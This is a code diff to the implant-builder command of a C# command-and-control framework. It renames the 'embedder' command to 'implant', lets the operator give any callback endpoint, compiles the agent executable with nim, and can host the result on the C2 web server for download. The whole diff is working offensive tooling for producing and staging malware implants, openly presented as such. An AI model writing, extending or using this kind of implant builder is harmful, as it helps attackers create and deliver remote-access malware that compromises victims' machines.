@@ -9,15 +9,18 @@ using System.Threading.Tasks;
 using Commander.Internal;
 using System.IO;
 using Commander.Models;
+using System.Text.RegularExpressions;
 
 namespace Commander.Commands.Laucher
 {
     public class BuildEmbedderCommandCommandOptions
     {
 
-        public string listenerName { get; set; }
+        public string endpoint { get; set; }
 
         public string fileName { get; set; }
+
+        public string save { get; set; }
 
         public bool debug { get; set; }
 
@@ -31,14 +34,15 @@ namespace Commander.Commands.Laucher
     {
         public override string Category => CommandCategory.Launcher;
         public override string Description => "Create a file embedding the agent";
-        public override string Name => "embedder";
+        public override string Name => "implant";
 
         public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;
 
         public override RootCommand Command => new RootCommand(this.Description)
         {
-            new Argument<string>("listenerName", "name of the listener used"),
-            new Option<string>(new[] { "--fileName", "-f" }, () => "embedder" ,"Nome of the file to be crafted"),
+            new Argument<string>("endpoint", "endpoint to reach"),
+            new Option<string>(new[] { "--fileName", "-f" }, () => null ,"Nome of the file to be crafted"),
+            new Option<string>(new[] { "--save", "-s" }, () => null, "Folder to save the generated file"),
             new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
             new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
@@ -47,28 +51,27 @@ namespace Commander.Commands.Laucher
 
         protected override async Task<bool> HandleCommand(CommandContext<BuildEmbedderCommandCommandOptions> context)
         {
-            var listeners = context.CommModule.GetListeners();
-            var listener = listeners.FirstOrDefault(l => l.Name.ToLower() == context.Options.listenerName.ToLower());
 
-            if (listener == null)
+            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
+            if (!endpoint.IsValid)
             {
-                context.Terminal.WriteLine($"No Listener named {context.Options.listenerName}");
+                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                 return false;
             }
 
-            string protocol = "http";
-            if (listener.Secured)
-                protocol = "https";
-
-            var dotnetparms = $"{protocol}:{listener.Ip}:{listener.PublicPort}";
-
-            string outFile = context.Options.fileName;
+            var outFile = context.Options.fileName;
+            if (string.IsNullOrEmpty(outFile))
+            {
+                outFile = "implant_" + endpoint.ProtocolString + "_" + Regex.Replace(endpoint.Address, @"[^\w\s]", "_");
+            }
             if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                 outFile += ".exe";
+
             string outPath = Path.Combine("/tmp", outFile);
-
-
-
+            if (!string.IsNullOrEmpty(context.Options.save))
+            {
+                outPath = Path.Combine(context.Options.save, outFile);
+            }
 
             var fileName = "Agent";
             if (context.Options.x86)
@@ -109,11 +112,11 @@ namespace Commander.Commands.Laucher
                 parms.Insert(3, $"--cpu:i386");
             else
                 parms.Insert(3, $"--cpu:amd64");
-            parms.Insert(4, $"-d:DotNetParams={dotnetparms}");
+            parms.Insert(4, $"-d:DotNetParams={endpoint.ToString()}");
 
 
 
-            context.Terminal.WriteLine($"[>] Generating embedder...");
+            context.Terminal.WriteLine($"[>] Generating implant...");
 
             if (context.Options.verbose)
                 context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
@@ -131,17 +134,14 @@ namespace Commander.Commands.Laucher
             }
 
             context.Terminal.WriteSuccess($"[*] Build succeed.");
-            context.Terminal.WriteInfo($"Embedder can be found at {outPath}");
+            context.Terminal.WriteInfo($"Implat can be found at {outPath}");
             if (context.Options.webhost)
             {
                 byte[] fileContent = File.ReadAllBytes(outPath);
-                context.CommModule.WebHost(listener.Id, outFile, fileContent);
+                context.CommModule.WebHost(outFile, fileContent);
 
-
-
-                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/wh/{outFile}";
-                context.Terminal.WriteLine($"[*] embedder hosted on : {url}");
-
+                string url = $"http(s)/teamserver/wh/{outFile}";
+                context.Terminal.WriteLine($"[*] Implant hosted on : {url}");
             }
 
             return true;
